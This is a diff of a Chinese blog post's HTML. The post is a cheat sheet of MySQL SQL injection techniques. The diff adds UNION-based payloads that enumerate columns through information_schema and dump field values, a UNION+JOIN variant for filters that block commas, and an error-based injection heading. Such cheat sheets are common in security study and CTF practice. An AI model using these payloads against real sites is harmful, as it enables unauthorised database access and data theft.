@@ -81,17 +81,17 @@
 
 
 
-<meta name="description" content="Mysql常用命令基本词 Mysql版本version()   当前用户名user()   数据库名database()   数据库路径@@datadir   操作系统版本@@version_compile_os   Mysql的安装路径@@basedir">
+<meta name="description" content="Mysql">
 <meta property="og:type" content="article">
 <meta property="og:title" content="sql注入常用合集">
 <meta property="og:url" content="http://yoursite.com/2019/08/26/sql注入合集/index.html">
 <meta property="og:site_name" content="Pursu0 blogs">
-<meta property="og:description" content="Mysql常用命令基本词 Mysql版本version()   当前用户名user()   数据库名database()   数据库路径@@datadir   操作系统版本@@version_compile_os   Mysql的安装路径@@basedir">
+<meta property="og:description" content="Mysql">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-08-26T10:30:36.687Z">
+<meta property="og:updated_time" content="2019-08-29T05:33:37.559Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sql注入常用合集">
-<meta name="twitter:description" content="Mysql常用命令基本词 Mysql版本version()   当前用户名user()   数据库名database()   数据库路径@@datadir   操作系统版本@@version_compile_os   Mysql的安装路径@@basedir">
+<meta name="twitter:description" content="Mysql">
 
 
 
@@ -375,7 +375,9 @@
       
 
       
-        <h2 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h2><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><h4 id="基本词"><a href="#基本词" class="headerlink" title="基本词"></a>基本词</h4><blockquote>
+        <h2 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h2><a id="more"></a>
+
+<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><h4 id="基本词"><a href="#基本词" class="headerlink" title="基本词"></a>基本词</h4><blockquote>
 <p>Mysql版本version()</p>
 </blockquote>
 <blockquote>
@@ -393,8 +395,6 @@
 <blockquote>
 <p>Mysql的安装路径@@basedir</p>
 </blockquote>
-<a id="more"></a>
-
 <h2 id="Union注入"><a href="#Union注入" class="headerlink" title="Union注入"></a>Union注入</h2><blockquote>
 <p>Mysql要大于5.0</p>
 </blockquote>
@@ -413,6 +413,21 @@
 <p>获取数据库中的表</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="literal">null</span>,<span class="literal">null</span>,...,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schama.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()</span><br></pre></td></tr></table></figure>
 
+<p>获取表中的字段</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="literal">null</span>,<span class="literal">null</span>,...,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="string">'&lt;表名&gt;'</span></span><br></pre></td></tr></table></figure>
+
+<p>获取各个字段值</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="literal">null</span>,<span class="keyword">group_concat</span>(&lt;字段<span class="number">1</span>&gt;,&lt;字段<span class="number">2</span>&gt;) <span class="keyword">from</span> &lt;当前表名&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="UNION-JOIN注入"><a href="#UNION-JOIN注入" class="headerlink" title="UNION+JOIN注入"></a>UNION+JOIN注入</h2><blockquote>
+<p>适用于：逗号被过滤</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> *  <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">1</span>)b <span class="keyword">join</span> (<span class="keyword">select</span> <span class="keyword">database</span>())c;</span><br></pre></td></tr></table></figure>
+
+<p>报错注入</p>
+<blockquote>
+<p>若有报错信息则选择报错注入</p>
+</blockquote>
 
       
     </div>
@@ -575,7 +590,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Mysql"><span class="nav-number">1.</span> <span class="nav-text">Mysql</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#常用命令"><span class="nav-number">1.1.</span> <span class="nav-text">常用命令</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#基本词"><span class="nav-number">1.1.1.</span> <span class="nav-text">基本词</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Union注入"><span class="nav-number">2.</span> <span class="nav-text">Union注入</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Mysql"><span class="nav-number">1.</span> <span class="nav-text">Mysql</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#常用命令"><span class="nav-number">1.1.</span> <span class="nav-text">常用命令</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#基本词"><span class="nav-number">1.1.1.</span> <span class="nav-text">基本词</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Union注入"><span class="nav-number">2.</span> <span class="nav-text">Union注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#UNION-JOIN注入"><span class="nav-number">3.</span> <span class="nav-text">UNION+JOIN注入</span></a></li></ol></div>
             
 
           </div>
